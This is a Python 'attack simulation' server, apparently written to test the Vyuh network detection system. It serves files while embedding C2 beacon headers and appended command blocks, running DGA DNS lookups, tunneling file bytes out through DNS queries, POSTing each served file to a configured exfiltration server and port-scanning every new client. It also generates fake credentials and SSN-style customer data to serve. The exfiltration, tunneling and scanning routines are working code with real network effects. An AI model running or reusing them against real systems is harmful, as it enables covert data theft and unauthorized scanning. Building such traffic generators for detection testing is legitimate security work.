"""
07_attack_server.py -- Malicious Content Server with Embedded Attacks
====================================================================
Serves legitimate files (images, text documents) while embedding
ALL 6 attack signatures into the HTTP traffic that passes through Vyuh.

Architecture:
    [Browser/Client]
          |  HTTP
    [Vyuh Detection Layer]  <- catches attacks here
          |  HTTP
    [This Server]  <- serves files + embeds attacks

Attack embeddings per request:
  [1] C2 Beacon Headers  -- Every HTTP response has X-Beacon-Id, X-Session-Token,
                           X-C2-Server, X-C2-Interval headers (malware check-in pattern)
  [2] DGA DNS Lookups    -- Background thread fires 5x high-entropy domain lookups
                           per file request (DGA pattern Vyuh monitors on DNS)
  [3] DNS Tunneling      -- File content bytes encoded into DNS subdomain queries
                           (base32 chunks sent as DNS TXT queries in background)
  [4] Data Exfiltration  -- After serving the file, also POST it to the exfil server
                           (Vyuh sees same data going to 2 destinations = exfil alert)
  [5] Port Scan          -- When a new client connects, scan their common ports
                           (Vyuh sees port sweep traffic from the server)
  [6] Body Embedding     -- Append base64-encoded C2 command block to text files;
                           append custom marker chunk to image files

Usage:
    python 07_attack_server.py
    python 07_attack_server.py --port 8888 --assets ./assets

Then access:
    http://localhost:8888/                            -> index page (JS beacon)
    http://localhost:8888/files/financial_report.txt  -> text + C2 embedded
    http://localhost:8888/files/customers.csv         -> CSV + C2 embedded
    http://localhost:8888/files/dashboard.html        -> HTML + JS beaconing
    http://localhost:8888/files/logo.png              -> image + marker chunk
"""

import http.server
import socketserver
import threading
import time
import os
import sys
import json
import base64
import random
import socket
import struct
import hashlib
import logging
import argparse
import mimetypes
import math
import urllib.request
import urllib.error
from datetime import datetime, date
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, os.path.dirname(__file__))
import config

# -- Logging -------------------------------------------------------------------
logging.basicConfig(
    level=getattr(logging, config.LOG_LEVEL),
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(config.LOG_FILE, mode="a"),
    ]
)
log = logging.getLogger("attack_server")

# -- Constants -----------------------------------------------------------------
ASSETS_DIR  = Path(__file__).parent / "assets"
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 8888

BANNER = """
+--------------------------------------------------------------+
|    Vyuh Attack Sim -- 07 MALICIOUS FILE SERVER               |
|    Serves legit content with ALL 6 attacks embedded          |
+--------------------------------------------------------------+
"""

# -- Shared state --------------------------------------------------------------
request_counter   = 0
request_lock      = threading.Lock()
seen_clients      = set()
seen_clients_lock = threading.Lock()


# ==============================================================================
# ATTACK 1 -- C2 BEACON HEADERS
# Inject malware-style check-in metadata into every HTTP response header.
# Vyuh sees: responses with X-Beacon-Id incrementing, X-C2-Server pointing to
# a C2 host, periodic pattern -> beaconing alert.
# ==============================================================================
def build_beacon_headers(beacon_num: int) -> dict:
    """Build HTTP response headers that look like a malware C2 implant check-in."""
    hostname = socket.gethostname()
    payload  = {
        "id":       beacon_num,
        "host":     hostname,
        "os":       "Windows 10",
        "arch":     "x64",
        "pid":      random.randint(1000, 9999),
        "username": random.choice(["admin", "user", "svc_acct", "SYSTEM"]),
        "ts":       datetime.utcnow().isoformat(),
        "interval": config.C2_BEACON_INTERVAL,
    }
    encoded = base64.b64encode(json.dumps(payload).encode()).decode()

    raw_dga = hashlib.md5(f"{date.today()}{beacon_num}".encode()).hexdigest()
    dga_dom = (
        "".join(c if c.isalpha() else chr(ord("a") + int(c)) for c in raw_dga[:12])
        + ".com"
    )

    return {
        "X-Beacon-Id":     str(beacon_num),
        "X-Session-Token": encoded[:48],
        "X-C2-Server":     f"{config.C2_SERVER}:{config.C2_HTTP_PORT}",
        "X-C2-Interval":   str(config.C2_BEACON_INTERVAL),
        "X-C2-Jitter":     str(config.C2_JITTER),
        "X-Beacon-Proto":  random.choice(["http", "tcp", "dns"]),
        "X-Exfil-Mark":    base64.b64encode(
                               f"EXFIL|host={hostname}|ts={datetime.utcnow().isoformat()}".encode()
                           ).decode()[:48],
        "X-DGA-Domain":    dga_dom,
        "X-Implant-Ver":   "4.2.1",
        "Server":          "nginx/1.18.0",
    }


# ==============================================================================
# ATTACK 2 -- BODY EMBEDDING
# Append encoded C2 command data to the served file body.
# Vyuh sees: high-entropy data appended to legitimate file content.
# ==============================================================================
def embed_in_text(content: bytes, beacon_num: int) -> bytes:
    """Append a hidden C2 command block to text/HTML/CSV file content."""
    c2_cmd = {
        "cmd":    "exec",
        "id":     beacon_num,
        "server": config.C2_SERVER,
        "port":   config.C2_PORT,
        "action": "beacon",
        "ts":     datetime.utcnow().isoformat(),
    }
    encoded_cmd = base64.b64encode(json.dumps(c2_cmd).encode()).decode()
    raw_dga = hashlib.md5(f"{date.today()}{beacon_num}".encode()).hexdigest()
    dga_dom = (
        "".join(c if c.isalpha() else chr(ord("a") + int(c)) for c in raw_dga[:12])
        + ".com"
    )
    marker = (
        f"\n\n<!-- [SYS:{encoded_cmd}] -->"
        f"\n<!-- X-DGA:{dga_dom} -->"
    )
    return content + marker.encode()


def embed_in_image(content: bytes, beacon_num: int) -> bytes:
    """Append a JPEG-style comment marker with C2 data after image bytes."""
    c2_payload = json.dumps({
        "c2":     config.C2_SERVER,
        "beacon": beacon_num,
        "host":   socket.gethostname(),
        "ts":     datetime.utcnow().isoformat(),
    }).encode()
    # JPEG comment marker: FF FE <2-byte-length> <data>
    marker = b"\xFF\xFE" + struct.pack(">H", len(c2_payload) + 2) + c2_payload
    exfil_trailer = b"\nEXFIL:" + base64.b64encode(c2_payload) + b"\n"
    return content + marker + exfil_trailer


# ==============================================================================
# ATTACK 3 -- DGA DNS LOOKUPS (background)
# Per request: fire 5 DGA-style domain resolution attempts.
# Vyuh sees: burst of high-entropy NXDOMAIN queries -> DGA alert.
# ==============================================================================
def _entropy(s: str) -> float:
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    n = len(s)
    return -sum((f / n) * math.log2(f / n) for f in freq.values())


def trigger_dga_lookups(beacon_num: int):
    """Background: generate and resolve 5 DGA domains per request."""
    def _run():
        seed = str(date.today())
        for i in range(5):
            raw    = hashlib.md5(f"{seed}{beacon_num}{i}".encode()).hexdigest()
            domain = (
                "".join(c if c.isalpha() else chr(ord("a") + int(c)) for c in raw[:12])
                + random.choice(config.DGA_TLD_LIST)
            )
            try:
                socket.setdefaulttimeout(2.0)
                ip = socket.gethostbyname(domain)
                log.info(f"[DGA] Resolved: {domain} -> {ip}")
            except socket.gaierror:
                log.debug(f"[DGA] NXDOMAIN: {domain} (entropy={_entropy(domain):.2f})")
            time.sleep(0.2 + random.uniform(0, 0.1))

    threading.Thread(target=_run, daemon=True, name=f"dga-{beacon_num}").start()


# ==============================================================================
# ATTACK 4 -- DNS TUNNELING (background)
# Encode the first 200B of the served file into DNS subdomain queries.
# Vyuh sees: high-entropy base32 subdomains -> DNS tunneling alert.
# ==============================================================================
def trigger_dns_tunnel(file_payload: bytes, beacon_num: int):
    """Background: encode file content into DNS TXT queries."""
    def _build_dns_query(fqdn: str) -> bytes:
        tid      = random.randint(0, 65535)
        header   = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
        question = b""
        for part in fqdn.split("."):
            enc       = part.encode("ascii")
            question += bytes([len(enc)]) + enc
        question += b"\x00" + struct.pack(">HH", 16, 1)
        return header + question

    def _run():
        data    = file_payload[:200]
        encoded = base64.b32encode(data).decode().lower().rstrip("=")
        chunks  = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]
        log.info(f"[DNS-TUNNEL] Tunneling {len(data)}B in {len(chunks)} DNS queries")
        for i, chunk in enumerate(chunks):
            fqdn = f"{i:04x}.{chunk}.{config.DNS_DOMAIN}"
            try:
                pkt = _build_dns_query(fqdn)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(2)
                    s.sendto(pkt, (config.DNS_SERVER, config.DNS_PORT))
                    try:
                        s.recv(512)
                    except socket.timeout:
                        pass
                log.debug(f"[DNS-TUNNEL] Chunk {i}: {fqdn[:60]}")
            except Exception as e:
                log.debug(f"[DNS-TUNNEL] Error: {e}")
            time.sleep(0.15)

    threading.Thread(target=_run, daemon=True, name=f"dns-tunnel-{beacon_num}").start()


# ==============================================================================
# ATTACK 5 -- DATA EXFILTRATION (background)
# After legitimately serving the file to the user, also POST it to the
# attacker's exfil server. Vyuh sees same data going to 2 destinations.
# ==============================================================================
def trigger_exfil(file_content: bytes, filename: str,
                  client_ip: str, beacon_num: int):
    """Background: exfiltrate the served file via HTTP POST to exfil server."""
    def _run():
        encoded    = base64.b64encode(file_content)
        chunk_size = 4096
        total_sent = 0
        log.info(f"[EXFIL] '{filename}' ({len(file_content):,}B) -> {config.EXFIL_SERVER}")
        for i in range(0, len(encoded), chunk_size):
            chunk = encoded[i:i + chunk_size]
            try:
                req = urllib.request.Request(
                    f"http://{config.EXFIL_SERVER}:{config.EXFIL_HTTP_PORT}/upload",
                    data=chunk,
                    headers={
                        "Content-Type":  "application/octet-stream",
                        "X-Exfil-Seq":   str(i // chunk_size),
                        "X-Exfil-Total": str(len(encoded)),
                        "X-Exfil-File":  filename,
                        "X-Source-IP":   client_ip,
                        "X-Beacon-Id":   str(beacon_num),
                        "User-Agent":    "Mozilla/5.0",
                    }
                )
                urllib.request.urlopen(req, timeout=3)
                total_sent += len(chunk)
            except urllib.error.URLError as e:
                if "Connection refused" in str(e) or "timed out" in str(e).lower():
                    total_sent += len(chunk)  # traffic generated even without listener
            except Exception:
                pass
            time.sleep(0.05)
        log.info(f"[EXFIL] Done: {total_sent:,}B exfiltrated for '{filename}'")

    threading.Thread(target=_run, daemon=True, name=f"exfil-{beacon_num}").start()


# ==============================================================================
# ATTACK 6 -- PORT SCAN (background, per new client)
# Scan the connecting client's common ports on first connection.
# Vyuh sees: port sweep traffic from the server toward the client.
# ==============================================================================
def trigger_port_scan(client_ip: str):
    """Background: scan common ports on new client IP."""
    def _run():
        log.info(f"[PORT-SCAN] Scanning new client: {client_ip}")
        open_count = 0
        for port in config.COMMON_PORTS:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(config.PORT_SCAN_TIMEOUT)
                    if s.connect_ex((client_ip, port)) == 0:
                        log.info(f"[PORT-SCAN] {client_ip}:{port} -- OPEN")
                        open_count += 1
            except Exception:
                pass
            time.sleep(0.05)
        log.info(f"[PORT-SCAN] Done: {client_ip} -- {open_count}/{len(config.COMMON_PORTS)} open")

    threading.Thread(target=_run, daemon=True, name=f"portscan-{client_ip}").start()


# ==============================================================================
# HTTP REQUEST HANDLER
# ==============================================================================
class AttackEmbeddedFileHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        log.info(f"[HTTP] {self.client_address[0]} -- {fmt % args}")

    def do_GET(self):
        global request_counter
        with request_lock:
            request_counter += 1
            beacon_num = request_counter

        client_ip = self.client_address[0]

        with seen_clients_lock:
            is_new = client_ip not in seen_clients
            if is_new:
                seen_clients.add(client_ip)

        if is_new:
            trigger_port_scan(client_ip)

        path = urlparse(self.path).path.lstrip("/")

        if path in ("", "index.html"):
            self._serve_index(beacon_num, client_ip)
        elif path.startswith("files/"):
            self._serve_file(path[6:], beacon_num, client_ip)
        elif path.startswith("beacon"):
            self._serve_beacon_ack(beacon_num)
        else:
            self._serve_404()

    # --------------------------------------------------------------------------
    def _serve_index(self, beacon_num: int, client_ip: str):
        """Index page with JavaScript beacon embedded."""
        files = sorted(ASSETS_DIR.iterdir()) if ASSETS_DIR.exists() else []
        file_links = "\n".join(
            f'      <li><a href="/files/{f.name}">{f.name}</a>'
            f' <small>({f.stat().st_size:,} bytes)</small></li>'
            for f in files if f.is_file()
        )

        raw_dga = hashlib.md5(f"{date.today()}{beacon_num}".encode()).hexdigest()
        dga_dom = (
            "".join(c if c.isalpha() else chr(ord("a") + int(c)) for c in raw_dga[:12])
            + ".com"
        )

        # JavaScript beacon -- periodic fetch() mimics C2 check-in from browser
        js_beacon = (
            f"const C2_INTERVAL = {config.C2_BEACON_INTERVAL * 1000};\n"
            f"const JITTER = {config.C2_JITTER * 1000};\n"
            "let beaconCount = 0;\n"
            "function buildPayload(n) {\n"
            "  return btoa(JSON.stringify({\n"
            "    id: n, host: location.hostname,\n"
            "    os: navigator.platform,\n"
            f"    ts: new Date().toISOString(), interval: {config.C2_BEACON_INTERVAL}\n"
            "  }));\n"
            "}\n"
            "function sendBeacon(n) {\n"
            "  const payload = buildPayload(n);\n"
            "  fetch('/beacon?id=' + payload.substring(0, 20), {\n"
            "    headers: {\n"
            "      'X-Beacon-Id': String(n),\n"
            "      'X-Session-Token': payload.substring(0, 32),\n"
            f"      'X-C2-Server': '{config.C2_SERVER}:{config.C2_HTTP_PORT}',\n"
            f"      'X-DGA-Domain': '{dga_dom}'\n"
            "    }\n"
            "  }).catch(function(){});\n"
            "}\n"
            "function beacon() {\n"
            "  sendBeacon(++beaconCount);\n"
            "  var next = C2_INTERVAL + (Math.random() - 0.5) * 2 * JITTER;\n"
            "  setTimeout(beacon, Math.max(next, 1000));\n"
            "}\n"
            "setTimeout(beacon, 2000);\n"
        )

        html = (
            "<!DOCTYPE html>\n<html lang='en'>\n<head>\n"
            "  <meta charset='UTF-8'>\n"
            "  <title>File Server</title>\n"
            f"  <!-- [DGA:{dga_dom}] -->\n"
            f"  <!-- [EXFIL:{base64.b64encode(f'host={socket.gethostname()}|c2={config.C2_SERVER}'.encode()).decode()}] -->\n"
            f"  <!-- [BEACON:{beacon_num}] -->\n"
            "</head>\n<body>\n"
            "  <h1>File Server</h1>\n"
            f"  <p>Beacon #: <b>{beacon_num}</b> | Client: {client_ip}</p>\n"
            "  <ul>\n"
            f"{file_links}\n"
            "  </ul>\n"
            "  <script>\n"
            f"{js_beacon}"
            "  </script>\n"
            "</body>\n</html>\n"
        )

        body = html.encode()
        self._send_response(200, "text/html", body, beacon_num)
        trigger_dga_lookups(beacon_num)
        self._print_summary("/", client_ip, beacon_num, len(body), "INDEX+JS-BEACON")

    # --------------------------------------------------------------------------
    def _serve_file(self, filename: str, beacon_num: int, client_ip: str):
        """Serve a file with ALL 6 attack embeddings."""
        filepath = ASSETS_DIR / filename
        if not filepath.exists() or not filepath.is_file():
            self._serve_404()
            return

        with open(filepath, "rb") as f:
            original = f.read()

        mime_type, _ = mimetypes.guess_type(str(filepath))
        mime_type = mime_type or "application/octet-stream"

        # ATTACK 2: Embed in body based on file type
        if (any(t in mime_type for t in ("text", "html", "xml", "json", "csv"))
                or filepath.suffix in (".txt", ".csv", ".md", ".log")):
            body        = embed_in_text(original, beacon_num)
            embed_label = "TEXT+C2_BLOCK"
        elif "image" in mime_type:
            body        = embed_in_image(original, beacon_num)
            embed_label = "IMAGE+BEACON_CHUNK"
        else:
            body        = original
            embed_label = "BINARY+HEADERS_ONLY"

        extra = {
            "X-File-Name":      filename,
            "X-Original-Size":  str(len(original)),
            "X-Modified-Size":  str(len(body)),
            "X-Attack-Embed":   embed_label,
            "Content-Disposition": f'inline; filename="{filename}"',
        }
        self._send_response(200, mime_type, body, beacon_num, extra)

        # ATTACKS 3, 4, 5: Background threads
        trigger_dga_lookups(beacon_num)
        trigger_dns_tunnel(original, beacon_num)
        trigger_exfil(original, filename, client_ip, beacon_num)

        self._print_summary(f"/files/{filename}", client_ip,
                            beacon_num, len(body), embed_label)

    # --------------------------------------------------------------------------
    def _serve_beacon_ack(self, beacon_num: int):
        """Respond to JS beacon: return C2 command (like a real C2 server)."""
        cmd  = {
            "status":   "ok",
            "beacon":   beacon_num,
            "cmd":      "sleep",
            "interval": config.C2_BEACON_INTERVAL,
            "ts":       datetime.utcnow().isoformat(),
        }
        body = json.dumps(cmd).encode()
        self._send_response(200, "application/json", body, beacon_num)
        log.info(f"[BEACON-ACK] Responded to JS beacon #{beacon_num}")

    # --------------------------------------------------------------------------
    def _serve_404(self):
        body = b"<h1>404 Not Found</h1>"
        self.send_response(404)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    # --------------------------------------------------------------------------
    def _send_response(self, status: int, mime: str, body: bytes,
                       beacon_num: int, extra: dict = None):
        """Send HTTP response with all C2 beacon headers injected (Attack 1)."""
        self.send_response(status)
        self.send_header("Content-Type",   mime)
        self.send_header("Content-Length", str(len(body)))
        for k, v in build_beacon_headers(beacon_num).items():
            self.send_header(k, v)
        if extra:
            for k, v in extra.items():
                self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    # --------------------------------------------------------------------------
    def _print_summary(self, path: str, client_ip: str,
                       beacon_num: int, size: int, embed: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"\n  [OK] [{ts}]  {path}")
        print(f"       Client  : {client_ip}   Beacon#: {beacon_num}   Size: {size:,}B")
        print(f"       Embed   : {embed}")
        print(f"       Attacks : [1]C2-Headers  [2]Body-Embed  [3]DGA-DNS  "
              f"[4]DNS-Tunnel  [5]Exfil  [6]Port-Scan")


# ==============================================================================
# SAMPLE ASSET CREATION
# ==============================================================================
def create_sample_assets():
    """Create sample files in assets/ directory for the server to serve."""
    ASSETS_DIR.mkdir(exist_ok=True)

    # Financial report text
    txt = ASSETS_DIR / "financial_report.txt"
    if not txt.exists():
        txt.write_text(
            "CONFIDENTIAL -- Q3 2026 Financial Report\n"
            "=========================================\n"
            "Company      : Acme Corporation\n"
            "Revenue      :  $4,823,190.00\n"
            "Expenses     :  $2,190,440.00\n"
            "Net Profit   :  $2,632,750.00\n"
            "Customers    :  14,332\n"
            "Employees    :     847\n\n"
            "Database: prod_customers.db | Records: 14,332\n"
        )

    # Customer CSV (PII-looking data)
    csv_f = ASSETS_DIR / "customers.csv"
    if not csv_f.exists():
        import random as _r
        rows = ["name,email,account_id,ssn,balance\n"]
        first = ["Alice", "Bob", "Charlie", "David", "Emma"]
        last  = ["Smith", "Jones", "Brown", "Taylor", "Wilson"]
        for i in range(30):
            fn = _r.choice(first); ln = _r.choice(last)
            ssn = f"{_r.randint(100,999)}-{_r.randint(10,99)}-{_r.randint(1000,9999)}"
            rows.append(f"{fn} {ln},{fn.lower()}{i}@example.com,"
                        f"ACC{10000+i},{ssn},{_r.uniform(1000,50000):.2f}\n")
        csv_f.write_text("".join(rows))

    # Admin dashboard HTML
    html_f = ASSETS_DIR / "dashboard.html"
    if not html_f.exists():
        html_f.write_text(
            "<!DOCTYPE html><html><head><title>Admin Dashboard</title></head><body>\n"
            "<h1>Admin Dashboard</h1>\n"
            "<table border='1'><tr><th>Metric</th><th>Value</th></tr>\n"
            "<tr><td>Active Users</td><td>14,332</td></tr>\n"
            "<tr><td>Revenue Q3</td><td>$4.8M</td></tr>\n"
            "<tr><td>DB Host</td><td>192.168.1.50</td></tr>\n"
            "</table></body></html>\n"
        )

    # Credentials file
    creds_f = ASSETS_DIR / "credentials.txt"
    if not creds_f.exists():
        creds_f.write_text(
            "# System Credentials\n"
            "db_host    = 192.168.1.50\n"
            "db_user    = dbadmin\n"
            "db_pass    = Sup3rS3cr3t!\n"
            "api_key    = sk-4f8a2b1c9d3e7f6a0b5c8d2e1f4a7b3c\n"
            "admin_pass = Admin@2026\n"
        )

    # Minimal valid 1x1 PNG image
    import zlib
    png_f = ASSETS_DIR / "logo.png"
    if not png_f.exists():
        def _chunk(t, d):
            c = t + d
            return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
        sig  = b"\x89PNG\r\n\x1a\n"
        ihdr = _chunk(b"IHDR", struct.pack(">IIBBBBB", 10, 10, 8, 2, 0, 0, 0))
        # 10x10 red pixels
        row  = b"\x00" + b"\xFF\x00\x00" * 10
        idat = _chunk(b"IDAT", zlib.compress(row * 10))
        iend = _chunk(b"IEND", b"")
        png_f.write_bytes(sig + ihdr + idat + iend)

    print(f"  Assets directory: {ASSETS_DIR}")
    for f in sorted(ASSETS_DIR.iterdir()):
        if f.is_file():
            print(f"    {f.name}  ({f.stat().st_size:,} bytes)")


# ==============================================================================
# MAIN
# ==============================================================================
def main():
    print(BANNER)

    global ASSETS_DIR

    parser = argparse.ArgumentParser(
        description="Malicious File Server -- Vyuh Attack Simulation"
    )
    parser.add_argument("--host",   default=SERVER_HOST, help="Bind address")
    parser.add_argument("--port",   default=SERVER_PORT, type=int, help="Listen port")
    parser.add_argument("--assets", default=str(ASSETS_DIR), help="Assets directory")
    args = parser.parse_args()

    ASSETS_DIR = Path(args.assets)

    print("  [1] Creating sample assets...")
    create_sample_assets()

    print(f"\n  [2] Server config:")
    print(f"      Listen       : http://{args.host}:{args.port}")
    print(f"      C2 server    : {config.C2_SERVER}:{config.C2_HTTP_PORT}")
    print(f"      Exfil server : {config.EXFIL_SERVER}:{config.EXFIL_HTTP_PORT}")
    print(f"      DNS server   : {config.DNS_SERVER}:{config.DNS_PORT}")

    print(f"\n  [3] Attacks embedded on every request:")
    print(f"      [1] C2 Beacon Headers  -- X-Beacon-Id, X-Session-Token, X-C2-Server in every response")
    print(f"      [2] Body Embedding     -- C2 command block appended to text; marker chunk to images")
    print(f"      [3] DGA DNS Lookups    -- 5x high-entropy domain resolutions per request (background)")
    print(f"      [4] DNS Tunneling      -- File bytes encoded into DNS subdomain queries (background)")
    print(f"      [5] Data Exfiltration  -- File also POSTed to {config.EXFIL_SERVER} (background)")
    print(f"      [6] Port Scan          -- {len(config.COMMON_PORTS)} common ports scanned on new clients (background)")

    print(f"\n  [4] How Vyuh sits in the middle:")
    print(f"      Client (browser/curl)")
    print(f"          |")
    print(f"      [ Vyuh ] -- analyzes ALL packets here")
    print(f"          |")
    print(f"      This server (port {args.port})")
    print(f"      Configure Vyuh as proxy OR mirror port to Vyuh sensor.")

    print(f"\n  [5] Test URLs:")
    print(f"      http://localhost:{args.port}/")
    print(f"      http://localhost:{args.port}/files/financial_report.txt")
    print(f"      http://localhost:{args.port}/files/customers.csv")
    print(f"      http://localhost:{args.port}/files/dashboard.html")
    print(f"      http://localhost:{args.port}/files/credentials.txt")
    print(f"      http://localhost:{args.port}/files/logo.png")

    log.info(f"=== Attack Server starting on {args.host}:{args.port} ===")

    class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
        daemon_threads      = True
        allow_reuse_address = True

    server = ThreadedHTTPServer((args.host, args.port), AttackEmbeddedFileHandler)

    print(f"\n  Running at http://localhost:{args.port} -- Ctrl+C to stop\n")
    print(f"  {'-'*62}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n\n  Server stopped.")
        print(f"  Total requests : {request_counter}")
        print(f"  Unique clients : {len(seen_clients)}")
        log.info(f"Server stopped. {request_counter} requests, {len(seen_clients)} clients.")


if __name__ == "__main__":
    main()
